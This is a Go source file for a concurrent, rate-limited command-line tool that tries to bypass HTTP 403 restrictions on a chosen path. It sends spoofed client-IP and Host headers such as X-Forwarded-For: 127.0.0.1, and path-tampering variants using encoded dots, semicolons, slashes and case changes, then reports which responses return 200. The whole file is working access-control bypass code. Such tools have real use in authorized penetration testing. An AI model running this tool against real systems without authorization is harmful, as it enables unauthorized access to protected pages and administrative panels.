package main

import (
	"flag"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

// Colors
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorCyan   = "\033[36m"
)

type Config struct {
	URL     string
	Path    string
	Threads int
	Rate    float64
	Headers map[string][]string
}

type Job struct {
	BypassType string
	URL        string
	Method     string
	Headers    map[string][]string
}

var bypassHeaders = []map[string][]string{
	{"X-Originating-IP": {"127.0.0.1"}},
	{"X-Forwarded-For": {"127.0.0.1"}},
	{"X-Forwarded": {"127.0.0.1"}},
	{"Forwarded-For": {"127.0.0.1"}},
	{"X-Remote-IP": {"127.0.0.1"}},
	{"X-Remote-Addr": {"127.0.0.1"}},
	{"X-ProxyUser-Ip": {"127.0.0.1"}},
	{"X-Original-URL": {"127.0.0.1"}},
	{"Client-IP": {"127.0.0.1"}},
	{"True-Client-IP": {"127.0.0.1"}},
	{"Cluster-Client-IP": {"127.0.0.1"}},
	{"X-ProxyUser-Ip": {"127.0.0.1"}},
	{"Host": {"localhost"}},
}

var pathBypassPatterns = []string{
	"%s/%s", // Default URL
	"%s/./%s",
	"%s/../%s",
	"%s/%%2e/%s",
	"%s/%s/",
	"%s/%s%%20/",
	"%s/;/%s",
	"%s/.;/%s",
	"%s//;//%s",
	"%s//%s//",
	"%s/%s.json",
	"%s/./%s/..",
}

func parseFlags() Config {
	var config Config
	config.Headers = make(map[string][]string)

	flag.StringVar(&config.URL, "u", "", "Target URL (e.g., https://example.com)")
	flag.StringVar(&config.Path, "path", "", "Path to tamper (e.g., admin-panel)")
	flag.IntVar(&config.Threads, "t", 10, "Number of concurrent threads (workers) default = 10")
	flag.Float64Var(&config.Rate, "rate", 5, "Requests per second default = 5")

	//For each instance of the -H flag add header to slice
	flag.Func("H", "Used to set custom headers", func(h string) error {

		parts := strings.SplitN(h, ":", 2)
		if len(parts) != 2 {
			return fmt.Errorf("invalid header format: %s", h)
		}

		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])
		config.Headers[key] = append(config.Headers[key], value)

		return nil
	})

	flag.Parse()

	if config.URL == "" || config.Path == "" {
		fmt.Println("Usage: -u <URL> -path <path> [-t threads] [-rate requests per second]")
		return Config{}
	}

	if !strings.HasPrefix(config.URL, "http") {
		config.URL = "https://" + config.URL
	}

	config.URL = strings.TrimSuffix(config.URL, "/")
	config.Path = strings.Replace(config.Path, "/", "", -1)

	return config
}

func generateBypassPaths(url string, path string) []string {

	var bypassPaths []string

	bypassPaths = append(bypassPaths, fmt.Sprintf("%s/%s", url, strings.ToUpper(path)))

	for _, pattern := range pathBypassPatterns {
		bypassPaths = append(bypassPaths, fmt.Sprintf(pattern, url, path))
	}
	return bypassPaths
}

func worker(client *http.Client, jobs <-chan Job, wg *sync.WaitGroup, rateLimiter <-chan time.Time) {
	defer wg.Done()

	for job := range jobs {
		<-rateLimiter

		req, err := http.NewRequest(job.Method, job.URL, nil)
		if err != nil {
			fmt.Printf("Error creating request: %v\n", err)
			continue
		}

		//Add headers to request if there are any in the job
		if len(job.Headers) != 0 {
			for key, values := range job.Headers {
				for _, value := range values {
					req.Header.Add(key, value)
				}
			}
		}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Response error: %v\n", err)
			continue
		}
		func() {
			defer resp.Body.Close()
			statusColor := ColorYellow

			switch resp.StatusCode {
			case http.StatusOK:
				statusColor = ColorGreen
			case http.StatusForbidden:
				statusColor = ColorRed
			case http.StatusNotFound:
				statusColor = ColorYellow
			}

			switch job.BypassType {
			case "path":
				fmt.Printf("Response: [%s%d%s], URL: %s\n", statusColor, resp.StatusCode, ColorReset, job.URL)
			case "header":
				fmt.Printf("Response: [%s%d%s], Header: ", statusColor, resp.StatusCode, ColorReset)
				for key, values := range job.Headers {
					fmt.Printf("%s: ", key)
					for _, value := range values {
						fmt.Printf("%s", value)
					}
					fmt.Printf("\n")
				}
			}

		}()
	}
}

func generateJobs(config Config) chan Job {
	jobs := make(chan Job, 1000)

	bypassPaths := generateBypassPaths(config.URL, config.Path)
	for _, url := range bypassPaths {
		job := Job{
			BypassType: "path",
			URL:        url,
			Method:     "GET",
			Headers:    config.Headers,
		}
		jobs <- job
	}

	defaultPath := fmt.Sprintf("%s/%s", config.URL, config.Path)
	for _, header := range bypassHeaders {
		job := Job{
			BypassType: "header",
			URL:        defaultPath,
			Method:     "GET",
			Headers:    header,
		}
		jobs <- job
	}
	close(jobs)
	return jobs
}

func startWorkerPool(client *http.Client, jobs chan Job, threads int, rate float64) *sync.WaitGroup {
	var wg sync.WaitGroup

	rateLimiter := time.Tick(time.Second / time.Duration(rate))

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(client, jobs, &wg, rateLimiter)
	}

	return &wg
}

func main() {

	config := parseFlags()

	jobs := generateJobs(config)

	client := &http.Client{}

	wg := startWorkerPool(client, jobs, config.Threads, config.Rate)

	wg.Wait()
}
